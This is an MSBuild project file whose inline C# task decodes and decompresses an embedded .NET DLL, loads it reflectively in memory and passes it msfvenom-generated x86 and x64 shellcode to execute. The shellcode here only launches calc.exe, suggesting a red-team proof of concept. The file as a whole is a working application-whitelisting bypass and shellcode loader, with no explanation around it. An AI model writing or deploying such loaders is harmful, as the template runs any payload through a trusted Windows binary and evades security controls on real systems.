<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
                    
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example1");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

